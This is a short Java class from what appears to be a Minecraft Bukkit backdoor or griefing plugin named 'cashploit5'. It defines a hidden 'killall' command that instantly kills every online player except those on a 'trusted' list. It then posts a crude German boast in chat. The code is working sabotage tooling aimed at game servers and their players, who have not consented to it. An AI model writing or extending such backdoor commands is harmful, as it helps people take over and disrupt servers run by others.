package de.cashploit5.v1_8_8.command;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import de.cashploit5.Main;

public class KillAll extends Command{

	public KillAll() {
		super("killall");
	}
	
	public void onCommand(Player p, Command command, String[] args) {
		for(Player all : Bukkit.getOnlinePlayers()) {
			if(!TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString()))
				all.setHealth(0);
		}
		Main.sendMessage(p, "§aAlle wurden abgestochen mit BLEISTIFT AMK!!!!");
	}

}
